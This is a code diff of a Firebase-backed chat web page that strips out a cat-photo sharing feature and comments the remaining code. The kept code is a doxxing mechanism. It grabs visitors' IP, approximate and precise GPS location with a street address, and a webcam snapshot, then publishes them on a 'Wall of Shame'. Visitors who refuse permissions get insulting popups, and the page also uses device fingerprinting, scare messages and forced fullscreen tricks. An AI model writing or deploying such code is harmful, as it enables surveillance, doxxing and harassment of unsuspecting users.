@@ -90,41 +90,6 @@ h1#banner {
 #shameBtn:hover {
   background:#ff6347;
 }
-#catsBtn {
-  background:#ff69b4;
-  color:#fff;
-  font-weight:bold;
-  font-size:18px;
-  padding:12px;
-  margin-top:10px;
-  width:100%;
-  cursor:pointer;
-  border:2px solid #ff1493;
-  border-radius:5px;
-  text-shadow:0 0 5px #000;
-}
-#catsBtn:hover {
-  background:#ff85c1;
-}
-#shareCatBtn {
-  position:fixed;
-  top:20px;
-  right:20px;
-  background:#ff69b4;
-  color:#fff;
-  padding:10px 20px;
-  border:2px solid #ff1493;
-  cursor:pointer;
-  font-family:monospace;
-  font-weight:bold;
-  font-size:14px;
-  border-radius:5px;
-  z-index:10001;
-  text-shadow:0 0 5px #000;
-}
-#shareCatBtn:hover {
-  background:#ff85c1;
-}
 
 html.shake {
   animation: fullScreenShake 0.5s infinite;
@@ -203,7 +168,7 @@ html.shake {
   border:none;
 }
 
-#shameModal, #catsModal, #cameraModal {
+#shameModal {
   display:none;
   position:fixed;
   top:0;
@@ -215,7 +180,7 @@ html.shake {
   overflow-y:auto;
   padding:20px;
 }
-#closeShame, #closeCats, #closeCamera {
+#closeShame {
   position:fixed;
   top:20px;
   right:20px;
@@ -230,116 +195,27 @@ html.shake {
   border-radius:5px;
   z-index:10000;
 }
-#closeShame:hover, #closeCats:hover, #closeCamera:hover {
+#closeShame:hover {
   background:#ff3333;
 }
-#shameModal h2, #catsModal h2 {
+#shameModal h2 {
   color:#f00;
   text-align:center;
   font-size:2.5rem;
   text-shadow:0 0 10px #f00, 0 0 20px #f00;
   margin-bottom:30px;
 }
-#catsModal h2 {
-  color:#ff69b4;
-  text-shadow:0 0 10px #ff69b4, 0 0 20px #ff69b4;
-}
-#shameList, #catsList {
+#shameList {
   margin-top:30px;
   max-width:800px;
   margin-left:auto;
   margin-right:auto;
-}
-#catsList {
-  display:grid;
-  grid-template-columns:repeat(auto-fill, minmax(250px, 1fr));
-  gap:20px;
-}
-.cat-photo {
-  background:rgba(255,105,180,0.2);
-  border:2px solid #ff69b4;
-  border-radius:8px;
-  padding:10px;
-  box-shadow:0 0 15px rgba(255,105,180,0.5);
-}
-.cat-photo img {
-  width:100%;
-  border-radius:5px;
-  border:2px solid #ff1493;
-}
-.cat-photo p {
-  color:#ff69b4;
-  text-align:center;
-  margin-top:10px;
-  font-size:0.9rem;
-}
-#cameraModal {
-  display:none;
-  justify-content:center;
-  align-items:center;
-  flex-direction:column;
-}
-#cameraChoiceContainer {
-  background:rgba(255,105,180,0.3);
-  padding:40px;
-  border:3px solid #ff69b4;
-  border-radius:10px;
-  text-align:center;
-}
-#cameraChoiceContainer h2 {
-  color:#ff69b4;
-  font-size:2rem;
-  margin-bottom:30px;
-  text-shadow:0 0 10px #ff69b4;
-}
-.camera-btn {
-  background:#ff69b4;
-  color:#fff;
-  padding:15px 30px;
-  margin:10px;
-  border:2px solid #ff1493;
-  border-radius:5px;
-  font-family:monospace;
-  font-size:1.2rem;
-  font-weight:bold;
-  cursor:pointer;
-}
-.camera-btn:hover {
-  background:#ff85c1;
-}
-#cameraPreview {
-  display:none;
-  flex-direction:column;
-  align-items:center;
-}
-#cameraVideo {
-  max-width:90%;
-  max-height:60vh;
-  border:3px solid #ff69b4;
-  border-radius:10px;
-  margin-bottom:20px;
-}
-#captureBtn {
-  background:#ff69b4;
-  color:#fff;
-  padding:15px 40px;
-  border:2px solid #ff1493;
-  border-radius:5px;
-  font-family:monospace;
-  font-size:1.2rem;
-  font-weight:bold;
-  cursor:pointer;
-}
-#captureBtn:hover {
-  background:#ff85c1;
 }
 </style>
 </head>
 <body>
 
 <canvas id="matrix"></canvas>
-
-<button id="shareCatBtn">📸 Share Your Cat!</button>
 
 <div id="fakeFullscreen">
   <div id="nukeOverlay">
@@ -354,25 +230,6 @@ html.shake {
   <button id="closeShame">CLOSE</button>
   <h2>🔥 WALL OF SHAME 🔥</h2>
   <div id="shameList"></div>
-</div>
-
-<div id="catsModal">
-  <button id="closeCats">CLOSE</button>
-  <h2>🐱 Beautiful Cats 🐱</h2>
-  <div id="catsList"></div>
-</div>
-
-<div id="cameraModal">
-  <button id="closeCamera">CLOSE</button>
-  <div id="cameraChoiceContainer">
-    <h2>Choose Camera</h2>
-    <button class="camera-btn" id="frontCameraBtn">📱 Front Camera</button>
-    <button class="camera-btn" id="backCameraBtn">📷 Back Camera</button>
-  </div>
-  <div id="cameraPreview">
-    <video id="cameraVideo" autoplay playsinline></video>
-    <button id="captureBtn">📸 Capture Photo</button>
-  </div>
 </div>
 
 <div id="chat-container">
@@ -404,7 +261,6 @@ html.shake {
   </div>
 
   <button id="shameBtn">👁️ VIEW WALL OF SHAME 👁️</button>
-  <button id="catsBtn">🐱 Beautiful Cats 🐱</button>
 
   <div style="margin-top:10px; color:#f00;">Banned users: <span id="bannedList">(none)</span></div>
 </div>
@@ -450,19 +306,6 @@ firebase.initializeApp(firebaseConfig);
   const shameModal=document.getElementById('shameModal');
   const closeShame=document.getElementById('closeShame');
   const shameList=document.getElementById('shameList');
-  const catsBtn=document.getElementById('catsBtn');
-  const catsModal=document.getElementById('catsModal');
-  const closeCats=document.getElementById('closeCats');
-  const catsList=document.getElementById('catsList');
-  const shareCatBtn=document.getElementById('shareCatBtn');
-  const cameraModal=document.getElementById('cameraModal');
-  const closeCamera=document.getElementById('closeCamera');
-  const cameraChoiceContainer=document.getElementById('cameraChoiceContainer');
-  const cameraPreview=document.getElementById('cameraPreview');
-  const cameraVideo=document.getElementById('cameraVideo');
-  const frontCameraBtn=document.getElementById('frontCameraBtn');
-  const backCameraBtn=document.getElementById('backCameraBtn');
-  const captureBtn=document.getElementById('captureBtn');
   const fakeFullscreen=document.getElementById('fakeFullscreen');
   const nukeOverlay=document.getElementById('nukeOverlay');
   const rickrollOverlay=document.getElementById('rickrollOverlay');
@@ -476,9 +319,8 @@ firebase.initializeApp(firebaseConfig);
   let pointerLockInterval = null;
   let fullscreenInterval = null;
   let fullscreenPrimed = false;
-  let userFingerprints = {};
-  let currentUserIP = null;
-  let currentCameraStream = null;
+  let userFingerprints = {}; // Track user fingerprints for alt detection
+  let currentUserIP = null; // Store current user's IP
 
   // ADVANCED DEVICE FINGERPRINTING
   let deviceId=localStorage.getItem('hh_device_id');
@@ -546,115 +388,6 @@ firebase.initializeApp(firebaseConfig);
   const doxxModeRef=db.ref('doxxMode');
   const shameRef=db.ref('wallOfShame');
   const fingerprintsRef=db.ref('fingerprints');
-  const catsRef=db.ref('beautifulCats');
-
-  // BEAUTIFUL CATS FUNCTIONS
-  async function shareCat() {
-    try {
-      // Request camera permission first
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-      stream.getTracks().forEach(track => track.stop()); // Stop immediately, just checking permission
-      
-      // Show camera choice modal
-      cameraModal.style.display = 'flex';
-      cameraChoiceContainer.style.display = 'block';
-      cameraPreview.style.display = 'none';
-    } catch(e) {
-      console.log('Camera denied');
-      
-      // Show NOOOOOO message
-      const noMsg = document.createElement('div');
-      noMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,105,180,0.95); color:#fff; padding:60px; border:3px solid #ff69b4; border-radius:10px; z-index:999999; text-align:center; font-size:3rem; box-shadow:0 0 30px #ff69b4; font-weight:bold;';
-      noMsg.innerHTML = `NOOOOOOOOOOOOOOOOOOOOOOOOOOOO😭😭😭`;
-      document.body.appendChild(noMsg);
-      
-      setTimeout(() => {
-        noMsg.remove();
-      }, 3000);
-    }
-  }
-
-  async function startCamera(facingMode) {
-    try {
-      currentCameraStream = await navigator.mediaDevices.getUserMedia({ 
-        video: { facingMode: facingMode },
-        audio: false 
-      });
-      
-      cameraVideo.srcObject = currentCameraStream;
-      cameraChoiceContainer.style.display = 'none';
-      cameraPreview.style.display = 'flex';
-    } catch(e) {
-      console.log('Camera failed', e);
-      alert('Could not access camera!');
-      cameraModal.style.display = 'none';
-    }
-  }
-
-  function capturePhoto() {
-    const canvas = document.createElement('canvas');
-    canvas.width = cameraVideo.videoWidth;
-    canvas.height = cameraVideo.videoHeight;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(cameraVideo, 0, 0);
-    
-    const photoData = canvas.toDataURL('image/jpeg', 0.8);
-    const username = userEl.value.trim() || 'Anonymous';
-    
-    // Save to Firebase
-    catsRef.push({
-      photo: photoData,
-      username: username,
-      timestamp: Date.now()
-    });
-    
-    // Stop camera
-    if (currentCameraStream) {
-      currentCameraStream.getTracks().forEach(track => track.stop());
-      currentCameraStream = null;
-    }
-    
-    // Close modal
-    cameraModal.style.display = 'none';
-    cameraVideo.srcObject = null;
-    cameraChoiceContainer.style.display = 'block';
-    cameraPreview.style.display = 'none';
-    
-    alert('Cat photo shared! 🐱💕');
-  }
-
-  function showCats() {
-    catsModal.style.display = 'block';
-    
-    catsRef.once('value', snapshot => {
-      catsList.innerHTML = '';
-      const cats = [];
-      snapshot.forEach(child => {
-        cats.push(child.val());
-      });
-      
-      cats.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-      
-      cats.forEach(cat => {
-        const div = document.createElement('div');
-        div.className = 'cat-photo';
-        
-        const date = new Date(cat.timestamp).toLocaleString();
-        
-        div.innerHTML = `
-          <img src="${cat.photo}" alt="Cat photo">
-          <p><strong>${escapeHtml(cat.username)}</strong></p>
-          <p style="font-size:0.8rem; color:#888;">${date}</p>
-        `;
-        
-        catsList.appendChild(div);
-      });
-      
-      if (cats.length === 0) {
-        catsList.innerHTML = '<p style="color:#ff69b4; text-align:center; font-size:1.5rem; padding:50px; grid-column:1/-1;">No cats yet... Share your cat! 🐱</p>';
-      }
-    });
-  }
 
   // Check if user is an alt account (checks IP, fingerprint, and deviceId)
   async function checkForAltAccount(username, userIP) {
@@ -664,6 +397,7 @@ firebase.initializeApp(firebaseConfig);
         let isAlt = false;
         let originalUsername = null;
         
+        // Check if this fingerprint, deviceId, OR IP exists with a different username
         for (const [user, data] of Object.entries(fingerprints)) {
           if (user !== username) {
             if (data.fingerprint === browserFingerprint || 
@@ -681,6 +415,7 @@ firebase.initializeApp(firebaseConfig);
     });
   }
 
+  // Save user fingerprint with IP
   function saveUserFingerprint(username, userIP) {
     fingerprintsRef.child(username).set({
       fingerprint: browserFingerprint,
@@ -690,15 +425,18 @@ firebase.initializeApp(firebaseConfig);
     });
   }
 
+  // Auto-delete messages from banned users
   function autoDeleteBannedMessages() {
     messagesRef.on('child_added', snapshot => {
       const message = snapshot.val();
       if (bannedUsers[message.username]) {
+        // Delete the message immediately
         snapshot.ref.remove();
       }
     });
   }
 
+  // Show pussy message (higher z-index than doxxed message)
   function showPussyMessage() {
     const pussyMsg = document.createElement('div');
     pussyMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:999999; text-align:center; font-size:2.5rem; box-shadow:0 0 30px #f00; font-weight:bold;';
@@ -710,12 +448,14 @@ firebase.initializeApp(firebaseConfig);
     }, 3000);
   }
 
+  // IP + DEVICE + BROWSER + LOCATION + COORDINATES + PHOTO LOGGING
   async function logToShame(username) {
     try {
       const ipResponse = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipResponse.json();
       const userIP = ipData.ip;
       
+      // Get approximate location from IP first
       let city = 'Unknown';
       let country = 'Unknown';
       let region = 'Unknown';
@@ -736,6 +476,7 @@ firebase.initializeApp(firebaseConfig);
         console.log('Geolocation failed');
       }
       
+      // Try to get PRECISE location via browser geolocation (requires permission)
       if (navigator.geolocation) {
         try {
           const position = await new Promise((resolve, reject) => {
@@ -746,10 +487,12 @@ firebase.initializeApp(firebaseConfig);
             });
           });
           
+          // Got precise location!
           latitude = position.coords.latitude;
           longitude = position.coords.longitude;
           locationType = 'GPS (precise)';
           
+          // Reverse geocode to get address
           try {
             const reverseGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
             const addressData = await reverseGeo.json();
@@ -761,40 +504,52 @@ firebase.initializeApp(firebaseConfig);
           }
         } catch(e) {
           console.log('Precise location denied or failed, using IP location');
+          
+          // They denied location - call them out!
           showPussyMessage();
         }
       }
       
+      // Try to get WEBCAM PHOTO (requires permission)
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { width: 640, height: 480 }, 
           audio: false 
         });
         
+        // Create video element to capture frame
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
         
+        // Wait for video to be ready
         await new Promise(resolve => {
           video.onloadedmetadata = resolve;
         });
         
+        // Wait a bit for camera to adjust
         await new Promise(resolve => setTimeout(resolve, 500));
         
+        // Capture photo
         const canvas = document.createElement('canvas');
         canvas.width = 640;
         canvas.height = 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, 640, 480);
         
+        // Convert to base64
         photoData = canvas.toDataURL('image/jpeg', 0.8);
         
+        // Stop camera
         stream.getTracks().forEach(track => track.stop());
       } catch(e) {
         console.log('Camera access denied or failed');
+        
+        // They denied camera - call them out!
         showPussyMessage();
       }
       
+      // Detect browser
       const ua = navigator.userAgent;
       let browser = 'Unknown';
       if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
@@ -806,6 +561,7 @@ firebase.initializeApp(firebaseConfig);
       else if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
       else if (ua.indexOf('Safari') > -1) browser = 'Safari';
       
+      // Detect device type
       let deviceType = 'Desktop';
       if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
         deviceType = 'Tablet';
@@ -813,6 +569,7 @@ firebase.initializeApp(firebaseConfig);
         deviceType = 'Mobile';
       }
       
+      // Detect OS
       let os = 'Unknown';
       if (ua.indexOf('Win') > -1) os = 'Windows';
       else if (ua.indexOf('Mac') > -1) os = 'MacOS';
@@ -842,10 +599,11 @@ firebase.initializeApp(firebaseConfig);
     }
   }
 
+  // WALL OF SHAME DISPLAY
   function showWallOfShame() {
     shameModal.style.display = 'block';
     
-    shameRef.once('value', snapshot => {
+    shameRef.on('value', snapshot => {
       shameList.innerHTML = '';
       const shamed = [];
       snapshot.forEach(child => {
@@ -1096,6 +854,7 @@ firebase.initializeApp(firebaseConfig);
       div.className='msg '+((m.username===currentUser)?'me':'other');
       if(admins[m.username]) div.classList.add('admin');
       
+      // Check if user is an alt
       if(m.isAlt) {
         div.classList.add('alt');
       }
@@ -1131,8 +890,13 @@ firebase.initializeApp(firebaseConfig);
       return;
     }
     
+    // Get user's IP
     const userIP = currentUserIP || await getUserIP();
+    
+    // Check for alt account (checks IP, fingerprint, and deviceId)
     const altCheck = await checkForAltAccount(username, userIP);
+    
+    // Save fingerprint with IP for this user
     saveUserFingerprint(username, userIP);
     
     devicesRef.child(username+'_'+deviceId).set({ timestamp:Date.now() });
@@ -1237,6 +1001,7 @@ firebase.initializeApp(firebaseConfig);
     const username = userEl.value.trim() || 'Anonymous';
     logToShame(username);
     
+    // Show a scary message (lower z-index so pussy message shows on top)
     const doxxMsg = document.createElement('div');
     doxxMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:99999; text-align:center; font-size:2rem; box-shadow:0 0 30px #f00;';
     doxxMsg.innerHTML = `
@@ -1252,7 +1017,6 @@ firebase.initializeApp(firebaseConfig);
     }, 5000);
   }
 
-  // EVENT LISTENERS
   sendBtn.addEventListener('click',sendMessage);
   msgEl.addEventListener('keydown',e=>{if(e.key==='Enter')sendMessage();});
   adminLoginBtn.addEventListener('click',loginAdmin);
@@ -1272,26 +1036,6 @@ firebase.initializeApp(firebaseConfig);
   closeShame.addEventListener('click', () => {
     shameModal.style.display = 'none';
   });
-  
-  // BEAUTIFUL CATS EVENT LISTENERS
-  catsBtn.addEventListener('click', showCats);
-  closeCats.addEventListener('click', () => {
-    catsModal.style.display = 'none';
-  });
-  shareCatBtn.addEventListener('click', shareCat);
-  closeCamera.addEventListener('click', () => {
-    if (currentCameraStream) {
-      currentCameraStream.getTracks().forEach(track => track.stop());
-      currentCameraStream = null;
-    }
-    cameraModal.style.display = 'none';
-    cameraVideo.srcObject = null;
-    cameraChoiceContainer.style.display = 'block';
-    cameraPreview.style.display = 'none';
-  });
-  frontCameraBtn.addEventListener('click', () => startCamera('user'));
-  backCameraBtn.addEventListener('click', () => startCamera('environment'));
-  captureBtn.addEventListener('click', capturePhoto);
 
   messagesRef.on('value',snapshot=>{
     const msgs=[]; 
@@ -1304,6 +1048,8 @@ firebase.initializeApp(firebaseConfig);
     bannedUsers={}; 
     snapshot.forEach(child=>{bannedUsers[child.key]=true;});
     updateBannedListUI();
+    
+    // Re-initialize auto-delete for new banned users
     autoDeleteBannedMessages();
   });
 
@@ -1331,8 +1077,12 @@ firebase.initializeApp(firebaseConfig);
   const sessionAdmin=sessionStorage.getItem('hh_admin_user');
   if(sessionAdmin&&admins[sessionAdmin]) adminPanel.style.display='block';
 
+  // Initialize user IP on page load
   getUserIP();
+
+  // Initialize auto-delete for banned users
   autoDeleteBannedMessages();
+
   primeFullscreen();
 })();
 </script>
